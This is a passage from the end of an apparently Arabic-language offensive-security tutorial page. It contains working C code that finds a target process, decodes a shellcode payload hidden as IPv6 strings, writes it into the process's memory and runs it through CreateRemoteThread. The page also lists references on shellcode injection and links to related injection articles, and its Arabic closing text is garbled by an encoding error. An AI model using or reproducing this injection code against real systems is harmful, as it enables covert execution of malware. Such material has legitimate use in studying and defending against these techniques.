                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlSecureZeroMemory(LowerName, MAX_PATH * 2);<br><br>
                        
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (dwSize < MAX_PATH * 2) {<br>
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (; i < dwSize; i++) {<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LowerName[i++] = '\0';<br>
                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
                                                    &nbsp;&nbsp;}<br><br>
                        
                                                    &nbsp;&nbsp;if (wcscmp(LowerName, szProcessName) == 0) {<br>
                                                        &nbsp;&nbsp;&nbsp;&nbsp;*dwProcessId = Proc.th32ProcessID;<br>
                                                        &nbsp;&nbsp;&nbsp;&nbsp;*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);<br>
                                                        &nbsp;&nbsp;&nbsp;&nbsp;if (*hProcess == NULL)<br>
                                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());<br>
                                                        &nbsp;&nbsp;&nbsp;&nbsp;break;<br>
                                                        &nbsp;&nbsp;}<br><br>
                        
                            } while (Process32Next(hSnapshot, &Proc));<br><br>
                        
                        
                        
                        _EndOfFunction:<br>
                        &nbsp;&nbsp;if (hSnapshot != NULL)<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hSnapshot);<br>
                                &nbsp;&nbsp;if (*dwProcessId == NULL || *hProcess == NULL)<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;return TRUE;<br><br>
                        
                        }<br><br>
                        
                        BOOL ShellcodeInjectionToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {<br>
                            &nbsp;&nbsp;PVOID pShellcodeAddress      = NULL;<br>
                            &nbsp;&nbsp;SIZE_T sNumberOfBytesWritten = NULL;<br>
                            &nbsp;&nbsp;DWORD dwOldProtection        = NULL;<br><br>
                        
                        
                            &nbsp;&nbsp;pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                            &nbsp;&nbsp;if (pShellcodeAddress == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAllocEx Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>

                                &nbsp;&nbsp;printf("[i] Allocated Memory at : 0x%p \n", pShellcodeAddress);<br>
                                &nbsp;&nbsp;printf("[i] Press &lt;ENTER> to write Shellcode ... \n");<br>
                                    &nbsp;&nbsp;getchar();<br>
                        
                                &nbsp;&nbsp;if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] WriteProcessMemory Failed with Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br><br>

                                    printf("[i] Successfully Written %d Bytes \n", sNumberOfBytesWritten);<br><br>
                        
                                    &nbsp;&nbsp;memset(pShellcode, '\0', sSizeOfShellcode);<br><br>
                        
                                    &nbsp;&nbsp;if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtectEx Failed with Error : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                        &nbsp;&nbsp;}<br><br>
                                        
                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Run ... ");<br>
                                        &nbsp;&nbsp;getchar();<br>

                                        &nbsp;&nbsp;if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateRemoteThread Failed with Error : %d \n", GetLastError());<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                            &nbsp;&nbsp;}<br><br>
                        
                                            &nbsp;&nbsp;return TRUE;<br><br>
                        
                                            &nbsp;&nbsp;}<br><br>
                        
                        int wmain(int argc, wchar_t* argv[]) {<br>
                            &nbsp;&nbsp;HANDLE hProcess = NULL;<br>
                            &nbsp;&nbsp;DWORD dwProcessId = NULL;<br>
                            &nbsp;&nbsp;PBYTE pDeobfuscatedPayload = NULL;<br>
                            &nbsp;&nbsp;SIZE_T sDeobfuscatedSize = NULL;<br><br><br>
                        
                            &nbsp;&nbsp;if (argc < 2) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;wprintf(L"[i] Usage : \"%s\" &lt;Process Name> \n", argv[0]);<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;wprintf(L"[i] Searching For Process ID of \"%s\" ... ", argv[1]);<br>
                                &nbsp;&nbsp;if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Process not found.\n");<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;printf("[i] DONE \n");<br>
                                    &nbsp;&nbsp;printf("[i] Found Target Process PID : %d \n", dwProcessId);<br><br>
                        
                                    &nbsp;&nbsp;printf("[i] Press &lt;ENTER> to Convert ... \n");<br>
                                    &nbsp;&nbsp;getchar();<br>
                        
                                    &nbsp;&nbsp;if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Ipv6Deobfuscation failed.\n");<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;goto _Cleanup;<br>
                                        &nbsp;&nbsp;}<br><br>
                        
                                        &nbsp;&nbsp;printf("[i] DONE \n");<br>
                                        &nbsp;&nbsp;printf("[i] Deobfuscated Payload at : 0x%p of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);<br><br>
                        
                                        &nbsp;&nbsp;if (!ShellcodeInjectionToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Shellcode Injection failed.\n");<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;goto _Cleanup;<br>
                                            &nbsp;&nbsp;}<br><br>
                        
                                            &nbsp;&nbsp;printf("[i] Injection Successful.\n");<br><br>
                        
                        _Cleanup:<br>
                        &nbsp;&nbsp;if (pDeobfuscatedPayload) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br>
                            &nbsp;&nbsp;}<br>
                            &nbsp;&nbsp;if (hProcess) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hProcess);<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;printf("[i] Press &lt;ENTER> to Quit ...");<br>
                                &nbsp;&nbsp;getchar();<br>
                                &nbsp;&nbsp;return 0;<br>
                        }<br>
                        
                </code></div>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p>ÙˆØ¨ÙƒØ¯Ø§ . Ø£ØªÙ…Ù†ÙŠ ØªÙƒÙˆÙ† Ø§Ø³ØªÙØ¯Øª Ø­Ø§Ø¬Ù‡ .. ÙˆÙ†Ù„ØªÙ‚ÙŠ ÙÙ€ Ù…Ù‚Ø§Ù„Ø© Ù‚Ø§Ø¯Ù…Ø© .. ÙˆÙ„Ùˆ Ø¹Ù†Ø¯Ùƒ Ø£ÙŠ ØªØ¹Ù„ÙŠÙ‚ ØŒ Ø§Ø³ØªÙØ³Ø§Ø± ØŒ Ø£ÙŠ Ø­Ø§Ø¬Ù‡ ..
                    Ù…ØªØªØ±Ø¯Ø¯Ø´ ÙˆÙƒÙ„Ù…Ù†ÙŠ.</p>
            </div>
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
                <h2>References</h2>
                <p>Ø®Ø¯Ù„Ùƒ Ù„ÙØ© ÙÙ€ Ø§Ù„Ù…ØµØ§Ø¯Ø± ÙˆØ§Ù„Ù…Ø±Ø§Ø¬Ø¹ ÙŠØ§ Ø¹Ø²ÙŠØ²ÙŠ:</p>

                <ul style="direction: ltr;">
                    <li><a href="https://medium.com/@laithsalman2522003/injecting-shellcode-into-running-processes-2f106a53f918"
                            target="_blank" class="download-link" s>Injecting shellcode into running processes</a>
                    </li>
                    <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection"
                            target="_blank" class="download-link">CreateRemoteThread Shellcode Injection</a></li>

                    <li><a href="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/" target="_blank"
                            class="download-link">Shellcode Injection in C# - Part 1 - Process Injection</a></li>

                </ul>
            </div>
            <div class="nav-buttons">
                <a href="./APC-Injection.html" onclick="nextArticle()" style="direction: ltr;">Next â†’</a>
                <a href="./DLL-Injection.html" onclick="previousArticle()" style="direction: ltr;">â† Previous</a>
            </div>
    </section>
    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
    </footer>

    <script src="../src/JS/script.js"></script>
    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
    <script>
        window.onload = function () {
            AOS.init({ offset: 0 });
        };
    </script>
    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
</body>

</html>